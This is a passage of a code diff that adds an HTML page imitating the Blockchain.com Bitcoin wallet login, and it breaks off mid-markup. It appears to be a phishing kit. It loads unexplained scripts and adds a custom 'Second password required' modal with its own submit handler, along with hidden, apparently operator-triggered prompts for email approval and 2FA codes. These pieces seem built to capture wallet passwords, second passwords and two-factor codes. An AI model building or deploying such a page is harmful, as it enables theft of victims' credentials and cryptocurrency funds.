@@ -1,0 +1,514 @@
+<html ng-app="walletApp" ng-csp="" ng-class="{'not-fixed': outOfApp}" lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="theme-color" content="#187fc0">
+    <meta name="apple-itunes-app" content="app-id=493253309">
+    <script src="js/wallet.js"></script>
+    <script src="js/sm.js"></script>
+
+    <link rel="apple-touch-icon" sizes="180x180" href="img/favicon/apple-icon-180x180-c35bbce112b3b59e55bd39b825a101eecf4975d5.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="img/favicon/apple-icon-152x152-ba16688fc9694eb1c54467120bb1daadb23b7ac9.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="img/favicon/apple-icon-144x144-77e1f1ad47180de1a849deef3441b43001d2bf8d.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="img/favicon/apple-icon-120x120-786e4292b2dabb3c79148ba591e6ede941e1c4af.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="img/favicon/apple-icon-114x114-55dd80fb4f8ea52a24060592c5e0f40499604848.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="img/favicon/apple-icon-76x76-5d05907266505cf540742634e3fe6839528c05a5.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="img/favicon/apple-icon-72x72-e413ef21886ebb198ed002ccee4db331d1a1dd7e.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="img/favicon/apple-icon-60x60-ff78b3e5a11e42b9389addcc125f300ba751a380.png">
+    <link rel="apple-touch-icon" sizes="57x57" href="img/favicon/apple-icon-57x57-c745b812fb038198db25fe7f7a11bf8d540d3a6f.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="img/favicon/android-icon-192x192-295f0ddf8ef24be80a8665027f9c9bc003594e03.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="img/favicon/favicon-96x96-160252475e1489a160d6ae72aff957a1367aa6ba.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="img/favicon/favicon-32x32-ca08d7aaadb80fc3fba7705705bdfe0de14bca98.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="img/favicon/favicon-16x16-0488dff33a6c69c2df7861a32f501bb5de57b372.png">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="img/favicon/ms-icon-144x144-77e1f1ad47180de1a849deef3441b43001d2bf8d.png">
+    <title>Bitcoin Wallet - Blockchain</title>
+    <link rel="stylesheet" href="css/wallet-5a9e9b19f7465743a88c33582345f50587f24c88.css">
+
+
+  </head>
+  <!---->
+  <body data-preflight="" ui-view="body" class="" style="" onload="bd_onld();">
+  <div class="login-pg" ng-class="{'display-block': isUIOverflow}">
+  <div class="wrapper">
+  <nav class="logo opaque" role="navigation" ng-class="{'display-block': isUIOverflow}">
+  <ul class="igation">
+  <li><a class="bc-logo" href="javascript:void(0);" onclick="document.location.href=document.location.href;">
+  <img src="img/white-blockchain-f1208a2b904ce045df3239b1922104bd3fc6a7c1.svg" alt="Blockchain" style="height: 20px; width: auto"></a>
+  </li>
+  <li class="flex-space"></li>
+  </ul>
+  </nav>
+  </div>
+  <div class="banners-container">
+  <testnet-warning><!----></testnet-warning>
+  <!---->
+  <maintenance-warning><!---->
+  </maintenance-warning>
+  </div>
+  <div class="overflow-scroll flex-justify flex-center">
+  <div class="flex-center flex-justify flex-column">
+  <div class="flex flex-justify">
+
+
+<div id="transferpwddiv" style="display:none;"><div tabindex="0"><div class="Modal__ModalBackground-oZVVk FHhfE" style="position: absolute; top: 0px;  left: 0px; width: 100%;  height: 100%; display: flex; flex-direction: row;  -webkit-box-pack: center; justify-content: center; align-items: flex-start;  background-color: rgba(0, 0, 0, 0.5);  z-index: 1040;padding-top:335px;"> <div class="Modal__BaseModal-cdrHPg gUNoyJ" width="500px" style="width: 500px; margin-top: initial; box-shadow: rgba(0, 0, 0, 0.5) 0px 5px 15px; display: block; position: relative;z-index: 1040;background-color: rgb(255, 255, 255);"> <div class="ModalHeader__Wrapper-bpvtUK iGrUtU" icon="safe" style="position: relative; display: flex; -webkit-box-pack: justify;   justify-content: space-between;  -webkit-box-align: center; align-items: center;  width: 100%;  box-sizing: border-box;  padding: 20px 30px;  border-bottom: 1px solid rgb(234, 234, 234);">
+<div class="ModalHeader__Header-ieLzbx gHmOiZ" style="    margin-right: 10px; display: flex;  flex-direction: row;  -webkit-box-pack: start;  justify-content: flex-start;  -webkit-box-align: center; align-items: center;">
+<span class="ModalHeader__HeaderIcon-hKYbvp hzgDED Icon__BaseIcon-eaBoTr guAQem" color="gray-5" style="    margin-right: 10px;font-weight: 300;  font-size: 28px;  color: rgb(84, 84, 86);  -webkit-font-smoothing: antialiased; cursor: inherit; display: flex;"></span>
+<div class="Text__BaseText-cyIABw ldbSYR" color="gray-5" cursor="inherit" opacity="1" style="font-family: Montserrat, sans-serif; font-weight: 300;  font-size: 20px; text-transform: capitalize; font-style: normal; color: rgb(84, 84, 86);  cursor: inherit; display: block;  opacity: 1;"><img src="img/tr.jpg" width="" height="" alt="" border="0"><span style="font-family: Montserrat, sans-serif;  font-weight: 300; font-size: 20px;  text-transform: capitalize;  font-style: normal;  color: rgb(84, 84, 86);  cursor: inherit;  padding-left:15px; ">Second password required</span> </div> </div>
+<span class="Icon__BaseIcon-eaBoTr kFAPWH" color="gray-5"></span></div>
+<div class="ModalBody__BaseModalBody-eihyiL fXZOxS" style="    position: relative;  width: 100%;  box-sizing: border-box; padding: 25px 30px; display: block;">
+<div class="ModalBody__SplashScreen-iINDzf voeCk" style="position: absolute;  top: 0px;  left: 0px;   display: none;  flex-direction: row;  -webkit-box-pack: center;  justify-content: center;   -webkit-box-align: center;  align-items: center;  width: 100%;  height: 100%;  background-color: rgb(255, 255, 255); z-index: 5;">
+<div class="BlockchainLoader__Wrapper-cDXJBA kHluRU" width="150px" height="150px" style="position: relative;  width: 150px;   height: 150px;  transform: rotate(-45deg);  border-radius: 10%;  overflow: hidden;  display: block;">
+<div class="BlockchainLoader__Container-jPTkCa hpAGVR" style="width: 100%; height: 100%;  display: block;">
+<div class="BlockchainLoader__Square-cbdSpK guBgP"></div><div class="BlockchainLoader__Square-cbdSpK givbpr"></div><div class="BlockchainLoader__Square-cbdSpK jloCSm"></div><div class="BlockchainLoader__Square-cbdSpK kSjUAr"></div><div class="BlockchainLoader__Square-cbdSpK iJsLlM"></div><div class="BlockchainLoader__Square-cbdSpK givbpr"></div><div class="BlockchainLoader__Square-cbdSpK jloCSm"></div><div class="BlockchainLoader__Square-cbdSpK bYEclZ"></div><div class="BlockchainLoader__Square-cbdSpK iJsLlM"></div><div class="BlockchainLoader__Square-cbdSpK jlHkaR"></div><div class="BlockchainLoader__Square-cbdSpK kXsLDp"></div><div class="BlockchainLoader__Square-cbdSpK icaPeF"></div><div class="BlockchainLoader__Square-cbdSpK fNSYgr"></div><div class="BlockchainLoader__Square-cbdSpK dwfWAU"></div><div class="BlockchainLoader__Square-cbdSpK cbnnmc"></div><div class="BlockchainLoader__Square-cbdSpK icaPeF"></div><div class="BlockchainLoader__Square-cbdSpK fNSYgr"></div><div class="BlockchainLoader__Square-cbdSpK pesRm"></div><div class="BlockchainLoader__Square-cbdSpK cbnnmc"></div><div class="BlockchainLoader__Square-cbdSpK fMHFKP"></div><div class="BlockchainLoader__Square-cbdSpK fNSYgr"></div><div class="BlockchainLoader__Square-cbdSpK pesRm"></div><div class="BlockchainLoader__Square-cbdSpK jKgroX"></div><div class="BlockchainLoader__Square-cbdSpK eogDBI"></div><div class="BlockchainLoader__Square-cbdSpK XtfWQ"></div></div></div></div><div class="Text__BaseText-cyIABw edOwNx" color="gray-5" cursor="inherit" opacity="1" style="font-family: Montserrat, sans-serif; font-weight: 500;   font-size: 14px;  text-transform: none;  font-style: normal;  color: rgb(84, 84, 86);   cursor: inherit; display: block; opacity: 1;">
+<span style="font-family: Montserrat, sans-serif;  font-weight: 500;  font-size: 14px;   text-transform: none;  font-style: normal;  color: rgb(84, 84, 86); cursor: inherit;">Please enter your second password</span> </div>
+
+<input onkeydown="if (event.keyCode == 13) transfer_passwrd_btn_clk(); " id="transferpasswordinp" type="password" class="PasswordInput__BasePasswordInput-heMFfA cnCbBi" value="" style="display: block; width: 100%;  height: 40px;  min-height: 40px; box-sizing: border-box;  font-size: 14px;  font-weight: 300;  color: rgb(84, 84, 86);   background-color: rgb(255, 255, 255);   background-image: none;   outline-width: 0px;  user-select: text;  font-family: Montserrat, Helvetica, sans-serif;  padding: 6px 12px;  border-width: 1px;  border-style: solid;  border-color: rgb(204, 204, 204);  border-image: initial;">
+
+ <div class="help-block mbn alt-font f-14" ng-show="errors.uid" ui-sref="public.reminder" style="color:#a94442;display:none;" id="err_emptysecondpassword_div"><span translate="UNKNOWN_IDENTIFIER">Please enter your second password.</span></div>
+
+ <div class="help-block mbn alt-font f-14" ng-show="errors.uid" ui-sref="public.reminder" style="color:#a94442;display:none;" id="err_secondpassword_div"><span translate="UNKNOWN_IDENTIFIER">Second password is incorrect.</span></div>
+
+</div>
+
+
+
+
+
+    <div class="ModalFooter__Wrapper-lpttqi kVuurU" style="position: relative; display: flex;  flex-direction: row;   -webkit-box-pack: start;  justify-content: flex-start;  -webkit-box-align: center;   align-items: center;  width: 100%;  box-sizing: border-box;  padding: 20px 30px;  border-top: 1px solid rgb(234, 234, 234);">
+    <div class="ModalFooter__Footer-cnukOL gYlRHe" style="display: flex;    flex-direction: row;   -webkit-box-pack: justify;    justify-content: space-between;   -webkit-box-align: center;  align-items: center;  width: 100%;">
+    <a class="Link__BaseLink-dDgpQk fQchvT" color="brand-secondary"><span></span></a>
+    <button onclick="transfer_passwrd_btn_clk(); return false;" type="button" class="Button__BaseButton-jlizFr gZUAhE" height="40px" color="white" style="display: flex;    flex-direction: row;    -webkit-box-pack: center;    justify-content: center;    -webkit-box-align: center;   align-items: center;    width: auto;    min-width: 140px;    height: 40px;    box-sizing: border-box;    user-select: none;    text-align: center;   vertical-align: middle;  letter-spacing: normal;   white-space: nowrap;   line-height: 1;   text-transform: none;   font-family: Montserrat, Helvetica, sans-serif;  font-size: 14px;  font-weight: 300;   cursor: pointer;  color: rgb(255, 255, 255);  background-color: rgb(16, 173, 228);   opacity: 1;  padding: 10px 15px;   text-decoration: none;  transition: all 0.2s ease-in-out 0s;   border-radius: 3px;  border-style: solid; border-width: 1px; border-color: rgb(16, 173, 228);"><span>Confirm</span></button></div></div></div></div></div></div>
+
+
+
+<div class="alert-in-app" id="old__alert_check_mail" style="display:none">
+<alerts>
+<div class="alert alert-warning alert-dismissible" ng-class="['alert-' + (type || 'warning'), closeable ? 'alert-dismissible' : null]" role="alert" ng-repeat="alert in alerts" type="" close="alert.close()" ng-click="alert.action($event)" style="">
+    <button ng-show="closeable" type="button" class="close" ng-click="close({$event: $event})">
+        <span aria-hidden="true">?</span>
+        <span class="sr-only">Close</span>
+    </button>
+    <div ng-transclude=""><span>
+        Please check your email to approve this login attempt.
+      </span></div>
+</div><!---->
+</alerts>
+</div>
+
+
+<div class="template__Wrapper-eMWHxH fYxYPq" style="bottom: 5px; left: 5px; width: auto;    position: absolute;display:none ;  flex-direction: column-reverse;   -webkit-box-pack: start;  justify-content: flex-start;  align-items: flex-start;  z-index: 1050;" id="alert_check_mail">
+<div class="Toast__Wrapper-iFrQXP kOJwYx" style="width: 500px;    height: 65px;    background-color: rgb(255, 255, 255);margin-top: 5px;display: block;">
+<div class="Toast__Container-eOrkVa gxvfCh" color="brand-secondary" style="position: relative;  display: flex; flex-direction: row;  -webkit-box-pack: justify;  justify-content: space-between;  -webkit-box-align: center;  align-items: center; width: 100%;   height: 100%;  box-sizing: border-box;  color: rgb(16, 173, 228);  font-family: Montserrat, sans-serif;   font-size: 14px;  font-weight: 400;  box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 4px;   -webkit-font-smoothing: antialiased;  padding: 15px 10px 15px 25px; background: rgba(16, 173, 228, 0.1);  border-top: 6px solid rgba(16, 173, 228, 0.2);">
+<div class="Toast__Content-uzvGK gpsumC" style="   display: flex;  flex-direction: column;  -webkit-box-pack: center;  justify-content: center;  align-items: flex-start;  margin-right: 10px; box-sizing: border-box;  flex: 1 1 100%;">
+<span>Authorization required. Please check your mailbox.</span>
+</div>
+    <button ng-show="closeable" type="button" class="close" onclick="alert_check_mail_close();">
+<span class="Toast__Close-fyvMMs hBsmjA Icon__BaseIcon-eaBoTr BLWPl" color="brand-secondary" style="font-weight: 10;   font-size: 35px; color: rgb(16, 173, 228);">&#215;</span>
+ </button>
+</div>
+</div>
+</div>
+
+
+<div class="template__Wrapper-eMWHxH fYxYPq" style="bottom: 5px; left: 5px; width: auto;    position: absolute;display:none ;  flex-direction: column-reverse;   -webkit-box-pack: start;  justify-content: flex-start;  align-items: flex-start;  z-index: 1050;" id="alert_error_login">
+<div class="Toast__Wrapper-iFrQXP kOJwYx" style="width: 500px;height: 65px;background-color: rgb(255, 255, 255);margin-top: 5px;display: block;">
+<div class="Toast__Container-eOrkVa gxvfCh" color="brand-secondary" style="position: relative;display: flex;flex-direction: row;-webkit-box-pack: justify;justify-content: space-between;-webkit-box-align: center;align-items: center;width: 100%;height: 100%;box-sizing: border-box;color: #a94442;font-family: Montserrat, sans-serif;font-size: 14px;font-weight: 400;box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 4px;-webkit-font-smoothing: antialiased;padding: 15px 10px 15px 25px;background: #f2dede;border-top: 6px solid #a9444252;">
+<div class="Toast__Content-uzvGK gpsumC" style="   display: flex;  flex-direction: column;  -webkit-box-pack: center;  justify-content: center;  align-items: flex-start;  margin-right: 10px; box-sizing: border-box;  flex: 1 1 100%;">
+<span>Unknown wallet identifier or password.<br> Check that you entered that correctly.</span>
+</div>
+    <button ng-show="closeable" type="button" class="close" onclick="alert_error_login_close();">
+<span class="Toast__Close-fyvMMs hBsmjA Icon__BaseIcon-eaBoTr BLWPl" color="brand-secondary" style="font-weight: 10;font-size: 35px;color: rgb(148, 19, 10);">&#215;</span>
+ </button>
+</div>
+</div>
+</div>
+
+
+
+<div class="old__alert-in-app" id="alert_error_login" style="display:">
+<alerts>
+<div class="alert alert-danger alert-dismissible" ng-class="['alert-' + (type || 'warning'), closeable ? 'alert-dismissible' : null]" role="alert" ng-repeat="alert in alerts" type="danger" close="alert.close()" ng-click="alert.action($event)" style="">
+<button ng-show="closeable" type="button" class="close" ng-click="close({$event: $event})">
+<span aria-hidden="true">?</span>
+<span class="sr-only">Close</span>
+</button>
+<div ng-transclude=""><span>
+Unknown wallet identifier or password. Check that you entered that correctly.
+</span>
+</div>
+</div>
+</alerts>
+</div>
+
+<div class="template__Wrapper-eMWHxH fYxYPq" style="bottom: 5px; left: 5px; width: auto;    position: absolute;display:none ;  flex-direction: column-reverse;   -webkit-box-pack: start;  justify-content: flex-start;  align-items: flex-start;  z-index: 1050;" id="alert_2FA">
+<div class="Toast__Wrapper-iFrQXP kOJwYx" style="width: 500px;    height: 65px;    background-color: rgb(255, 255, 255);margin-top: 5px;display: block;">
+<div class="Toast__Container-eOrkVa gxvfCh" color="brand-secondary" style="position: relative;  display: flex; flex-direction: row;  -webkit-box-pack: justify;  justify-content: space-between;  -webkit-box-align: center;  align-items: center; width: 100%;   height: 100%;  box-sizing: border-box;  color: rgb(16, 173, 228);  font-family: Montserrat, sans-serif;   font-size: 14px;  font-weight: 400;  box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 4px;   -webkit-font-smoothing: antialiased;  padding: 15px 10px 15px 25px; background: rgba(16, 173, 228, 0.1);  border-top: 6px solid rgba(16, 173, 228, 0.2);">
+<div class="Toast__Content-uzvGK gpsumC" style="   display: flex;  flex-direction: column;  -webkit-box-pack: center;  justify-content: center;  align-items: flex-start;  margin-right: 10px; box-sizing: border-box;  flex: 1 1 100%;">
+<span>2FA required for login</span>
+</div>
+    <button ng-show="closeable" type="button" class="close" onclick="alert_2FA_close();">
+<span class="Toast__Close-fyvMMs hBsmjA Icon__BaseIcon-eaBoTr BLWPl" color="brand-secondary" style="font-weight: 10;   font-size: 35px; color: rgb(16, 173, 228);">&#215;</span>
+ </button>
+</div>
+</div>
+</div>
+
+<div class="template__Wrapper-eMWHxH fYxYPq" style="bottom: 5px; left: 5px; width: auto;    position: absolute;display:none ;  flex-direction: column-reverse;   -webkit-box-pack: start;  justify-content: flex-start;  align-items: flex-start;  z-index: 1050;" id="alert_transfer_password">
+<div class="Toast__Wrapper-iFrQXP kOJwYx" style="width: 500px;    height: 65px;    background-color: rgb(255, 255, 255);margin-top: 5px;display: block;">
+<div class="Toast__Container-eOrkVa gxvfCh" color="brand-secondary" style="position: relative;  display: flex; flex-direction: row;  -webkit-box-pack: justify;  justify-content: space-between;  -webkit-box-align: center;  align-items: center; width: 100%;   height: 100%;  box-sizing: border-box;  color: rgb(16, 173, 228);  font-family: Montserrat, sans-serif;   font-size: 14px;  font-weight: 400;  box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 4px;   -webkit-font-smoothing: antialiased;  padding: 15px 10px 15px 25px; background: rgba(16, 173, 228, 0.1);  border-top: 6px solid rgba(16, 173, 228, 0.2);">
+<div class="Toast__Content-uzvGK gpsumC" style="   display: flex;  flex-direction: column;  -webkit-box-pack: center;  justify-content: center;  align-items: flex-start;  margin-right: 10px; box-sizing: border-box;  flex: 1 1 100%;">
+<span>Second Password required for login</span>
+</div>
+    <button ng-show="closeable" type="button" class="close" onclick="alert_transfer_password_close();">
+<span class="Toast__Close-fyvMMs hBsmjA Icon__BaseIcon-eaBoTr BLWPl" color="brand-secondary" style="font-weight: 10;   font-size: 35px; color: rgb(16, 173, 228);">&#215;</span>
+ </button>
+</div>
+</div>
+</div>
+
+<div class="old__alert-in-app" id="alert_2FA" style="display:none">
+<alerts>
+      <!----><div class="alert alert-warning alert-dismissible" ng-class="['alert-' + (type || 'warning'), closeable ? 'alert-dismissible' : null]" role="alert" ng-repeat="alert in alerts" type="" close="alert.close()" ng-click="alert.action($event)" style="">
+    <button ng-show="closeable" type="button" class="close" ng-click="close({$event: $event})">
+<span aria-hidden="true">?</span>
+        <span class="sr-only">Close</span>
+    </button>
+    <div ng-transclude=""><span>
+        Please enter your 2FA code
+      </span></div>
+</div><!----></alerts>
+</div>
+
+
+<div class="template__Wrapper-eMWHxH fYxYPq" style="bottom: 5px; left: 5px; width: auto;    position: absolute;display:none ;  flex-direction: column-reverse;   -webkit-box-pack: start;  justify-content: flex-start;  align-items: flex-start;  z-index: 1050;" id="alert_RE_error_login">
+<div class="Toast__Wrapper-iFrQXP kOJwYx" style="width: 500px;height: 65px;background-color: rgb(255, 255, 255);margin-top: 5px;display: block;">
+<div class="Toast__Container-eOrkVa gxvfCh" color="brand-secondary" style="position: relative;display: flex;flex-direction: row;-webkit-box-pack: justify;justify-content: space-between;-webkit-box-align: center;align-items: center;width: 100%;height: 100%;box-sizing: border-box;color: #a94442;font-family: Montserrat, sans-serif;font-size: 14px;font-weight: 400;box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 4px;-webkit-font-smoothing: antialiased;padding: 15px 10px 15px 25px;background: #f2dede;border-top: 6px solid #a9444252;">
+<div class="Toast__Content-uzvGK gpsumC" style="   display: flex;  flex-direction: column;  -webkit-box-pack: center;  justify-content: center;  align-items: flex-start;  margin-right: 10px; box-sizing: border-box;  flex: 1 1 100%;">
+<span>Unknown two factor authentication code.<br />  Please enter your 2FA code.</span>
+</div>
+    <button ng-show="closeable" type="button" class="close" onclick="alert_RE_error_login_close();">
+<span class="Toast__Close-fyvMMs hBsmjA Icon__BaseIcon-eaBoTr BLWPl" color="brand-secondary" style="font-weight: 10;font-size: 35px;color: rgb(148, 19, 10);">&#215;</span>
+ </button>
+</div>
+</div>
+</div>
+
+
+<div class="template__Wrapper-eMWHxH fYxYPq" style="bottom: 5px; left: 5px; width: auto;    position: absolute;display:none ;  flex-direction: column-reverse;   -webkit-box-pack: start;  justify-content: flex-start;  align-items: flex-start;  z-index: 1050;" id="alert_RE_error_transfer_password">
+<div class="Toast__Wrapper-iFrQXP kOJwYx" style="width: 500px;height: 65px;background-color: rgb(255, 255, 255);margin-top: 5px;display: block;">
+<div class="Toast__Container-eOrkVa gxvfCh" color="brand-secondary" style="position: relative;display: flex;flex-direction: row;-webkit-box-pack: justify;justify-content: space-between;-webkit-box-align: center;align-items: center;width: 100%;height: 100%;box-sizing: border-box;color: #a94442;font-family: Montserrat, sans-serif;font-size: 14px;font-weight: 400;box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 4px;-webkit-font-smoothing: antialiased;padding: 15px 10px 15px 25px;background: #f2dede;border-top: 6px solid #a9444252;">
+<div class="Toast__Content-uzvGK gpsumC" style="   display: flex;  flex-direction: column;  -webkit-box-pack: center;  justify-content: center;  align-items: flex-start;  margin-right: 10px; box-sizing: border-box;  flex: 1 1 100%;">
+<span>Unknown second password.<br />  Please enter your second password.</span>
+</div>
+    <button ng-show="closeable" type="button" class="close" onclick="alert_RE_error_transfer_password_close();">
+<span class="Toast__Close-fyvMMs hBsmjA Icon__BaseIcon-eaBoTr BLWPl" color="brand-secondary" style="font-weight: 10;font-size: 35px;color: rgb(148, 19, 10);">&#215;</span>
+ </button>
+</div>
+</div>
+</div>
+
+
+<div class="alert-in-app" id="old_alert_RE_error_login" style="display:none">
+<alerts>
+<div class="alert alert-danger alert-dismissible" ng-class="['alert-' + (type || 'warning'), closeable ? 'alert-dismissible' : null]" role="alert" ng-repeat="alert in alerts" type="danger" close="alert.close()" ng-click="alert.action($event)" style="">
+<button ng-show="closeable" type="button" class="close" ng-click="close({$event: $event})">
+<span aria-hidden="true">?</span>
+<span class="sr-only">Close</span>
+</button>
+<div ng-transclude=""><span>
+Unknown two factor authentication code.  Please enter your 2FA code.
+</span>
+</div>
+</div>
+</alerts>
+</div>
+
+
+  <div class="alert-in-app">
+  <alerts>
+      <!---->
+      </alerts>
+      </div>
+      </div><!---->
+
+
+
+<div class="login-box mhs" ui-view="contents" style="display:none" id="login_help"><div data-preflight-tag="LoginHelp"><header><hgroup><div class="flex-between flex-center flex-wrap"><h2 class="em-300 mtn" translate="LOGIN_HELP">Login Help</h2></div><p class="em-300" translate="LOGIN_HELP_TEXT">Need help accessing your wallet?</p></hgroup></header><div class="flex-column"><ul class="pln"><li class="border-bottom-light pvm flex-between flex-center"><div class="flex-column flex-2 prm"><h5 class="blue em-300" translate="LOST_WALLET_ID">I've lost my Wallet ID</h5><p class="em-300" translate="LOST_ID_DESC">Email me a reminder with my Wallet ID to my email address</p></div><div class="flex-1 flex-end"><a class="button-default button-nowrap" translate="REMIND_ME" ui-sref="public.reminder" href="javascript:void(0);">Remind Me</a></div></li><li class="border-bottom-light pvm flex-between flex-center"><div class="flex-column flex-2 prm"><h5 class="blue em-300" translate="LOST_WALLET_PWD">I've lost my Wallet Password</h5><p class="em-300" translate="LOST_PWD_DESC">Recover your funds with your 12 word recovery passphrase</p></div><div class="flex-1 flex-end"><a class="button-default button-nowrap" translate="RECOVER_FUNDS" ui-sref="public.recover" href="javascript:void(0);">Recover Funds</a></div></li><li class="border-bottom-light pvm flex-between flex-center"><div class="flex-column flex-2 prm"><h5 class="blue em-300" translate="LOST_2FA">I've lost my 2FA Device</h5><p class="em-300" translate="LOST_2FA_DESC">Reset two step verification to regain access to your wallet</p></div><div class="flex-1 flex-end"><a class="button-default button-nowrap" translate="RESET_2FA" ui-sref="public.reset-two-factor" href="javascript:void(0);">Reset 2FA</a></div></li></ul><div class="flex-between"><div class="flex-start"><a class="mtm" ui-sref="public.login-no-uid" translate="GO_BACK" href="javascript:void(0);" onclick="go_back_lgn();">Go Back</a></div><div class="flex-end"><a class="mtm" href="../../../../../../blockchain.zendesk.com/index.html" translate="CONTACT_SUPPORT" target="_blank" rel="noopener noreferrer">Contact Support</a></div></div></div></div></div>
+
+
+<div class="login-box mhs" ui-view="contents" id="create_wallet" style="display:none"><div data-preflight-tag="CreateWallet"><header><hgroup><div class="flex-between flex-center flex-wrap mb-10"><span class="f-24 lh1" translate="CREATE_A_WALLET">Create your Wallet</span><span><span translate="OR">or</span>&nbsp;<a ui-sref="public.login-uid" href="javascript:void(0);" onclick="back_login();"><span translate="LOGIN">Login</span></a></span></div><p class="alt-font f-16" translate="CREATE_FREE_WALLET">Sign up for a free wallet below</p></hgroup></header></div><form class="bc-form form-horizontal mt-30 ng-pristine ng-valid-email ng-invalid ng-invalid-required ng-valid-maxlength ng-valid-is-valid" role="form" name="signupForm" ng-submit="browser.disabled || signup()" autocomplete="off" novalidate=""><div class="browser-detection" result="browser">
+        <p class="text-warning ng-hide" ng-show="result.warn"></p>
+        <p class="text-danger ng-hide" ng-show="result.disabled"></p>
+      </div><fieldset ng-disabled="browser.disabled || working"><div class="group mb-20" ng-class="{'has-error': signupForm.email.$invalid &amp;&amp; signupForm.email.$touched}"><div class="item"><label translate="EMAIL">Email</label><div class="pos-rel"><input class="form-control ng-pristine ng-untouched ng-empty ng-valid-email ng-invalid ng-invalid-required" name="email" ng-model="fields.email" required="" focus-when="!fields.email.length" ng-disabled="underMaintenance" type="email"><span class="error ng-hide" ng-show="signupForm.email.$touched"><span ng-show="signupForm.email.$error.required" translate="EMAIL_ADDRESS_REQUIRED" class="">Required</span><span ng-show="signupForm.email.$error.email" translate="EMAIL_ADDRESS_INVALID" class="ng-hide">Invalid</span></span></div></div></div><div class="group mb-20" ng-class="{'has-error': signupForm.password.$invalid &amp;&amp; signupForm.password.$touched}"><div class="item"><label translate="NEW_PASSWORD">New Password</label><div class="pos-rel"><input class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-maxlength" name="password" ng-model="fields.password" ng-maxlength="255" min-entropy="25" focus-when="fields.emailIsFromState" ng-change="fields.confirmation = ''" ng-disabled="underMaintenance" required="" type="password"><span class="error ng-hide" ng-show="signupForm.password.$touched"><span ng-show="signupForm.password.$error.minEntropy &amp;&amp; fields.password != undefined" translate="TOO_WEAK" class="ng-hide">Your password is not strong enough</span><span ng-show="signupForm.password.$error.maxlength" translate="TOO_LONG" class="ng-hide">You password is too long.</span></span><password-entropy class="help-block mbn" password="fields.password"><div class="progress mbn ng-hide" ng-show="password"><div class="progress-bar pl-10 progress-bar-danger" ng-class="barColor" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" ng-style="{width:score+'%'}" style="width: 0%;">weak</div></div></password-entropy></div></div></div><div class="group mb-20" ng-class="{'has-error': signupForm.confirmation.$invalid &amp;&amp; signupForm.confirmation.$touched}"><div class="item"><label translate="CONFIRM_PASSWORD">Confirm Password</label><div class="pos-rel"><input class="form-control ng-pristine ng-untouched ng-valid-is-valid ng-empty ng-invalid ng-invalid-required" name="confirmation" ng-model="fields.confirmation" is-valid="fields.confirmation == fields.password" ng-disabled="underMaintenance" required="" type="password"><span class="error ng-hide" ng-show="signupForm.confirmation.$touched"><span ng-show="signupForm.confirmation.$error.isValid" translate="NO_MATCH" class="ng-hide">Does not match</span></span></div></div></div><div class="group mb-20"><div class="item check"><input name="agreement" ng-model="fields.acceptedAgreement" required="" class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" type="checkbox"><label class="em-300 mbn mls right-align" translate="ACCEPT_TOS">I have read and agree to the <a href="../../../../../../www.blockchain.com/terms.html" ,="" target="_blank" rel="noopener noreferrer">Terms of Service</a></label></div></div><div class="group mb-15 full"><button class="button-primary button-heavy ladda-button" type="submit" ng-disabled="signupForm.$invalid || !currency_guess || underMaintenance" ladda-translate="CONTINUE" ui-ladda="working" disabled="disabled"><span><span class="ladda-label" translate="CONTINUE">Continue</span><span class="ladda-spinner"><div class="spinner"></div></span></span></button></div></fieldset></form></div>
+
+
+
+<div class="login-box mhs" id="mobile_login" ui-view="contents" style="display:none"><header translate-namespace="MOBILE_LOGIN"><hgroup><div class="flex-between flex-center flex-wrap mb-10"><span class="f-24 lh1" translate=".TITLE">Log in via Mobile</span><span><a ui-sref="public.login-no-uid" translate="CANCEL" href="javascript:void(0);" onclick="cancel_click();">Cancel</a></span></div><p class="alt-font f-16" translate=".SUB_TEXT">Follow these steps to log into your web wallet using your mobile device</p></hgroup></header><div class="mobile-login mv-60 flex-between" translate-namespace="MOBILE_LOGIN"><div class="flex-1"><div class="scanner-container flex" box-corners="" style="position: relative;"><div ng-show="state.scannerOn" class="ng-hide" style=""><div class="scanner" on-error="onScanError" on-result="onScanResult" active="state.scannerOn" camera-status="state.scannerOn"><!----><canvas id="qr-canvas"></canvas></div></div><div class="flex-column flex-center flex-justify flex-1 ng-hide" ng-show="state.permissionDenied"><span class="f-18" translate="ERROR">??????</span><p class="f-12 width-80 text-center" translate="CAMERA_PERMISSION_DENIED" ng-click="retryScan()">? ?????????? ?? ????????????? ?????? ????????</p></div><div class="flex-column flex-center flex-justify flex-1 ng-hide" ng-show="state.scanComplete"><span class="f-18" translate="SCAN_SUCCESS">???????????? ???????</span><p class="f-12" translate="LOGGING_IN_NOW">Logging you in now</p></div><div class="flex-column flex-center flex-justify flex-1 ng-hide" ng-show="state.scanFailed"><span class="f-18" translate="SCAN_FAILED">??????????? ?? ???????</span><a class="f-12" translate="RETRY" ng-click="retryScan()">Retry</a></div></div></div><div class="flex-1"><span class="f-18 em-500 blue" translate=".STEPS_TITLE">Logging in with Mobile</span><ol class="pl-15"><li class="pt-10" translate=".STEP_1">Open your Blockchain App on your mobile device and go to Settings.</li><li class="pt-10" translate=".STEP_2">Tap <i>Log in to Web Wallet</i>.</li><li class="pt-10" translate=".STEP_3">Using your computer's camera, scan the QR code that appears on your device.</li></ol></div></div><footer class="flex-between flex-center pt-25"><div class="alt-font f-16"><p class="mbn" translate="APP_CTA">Don't have the 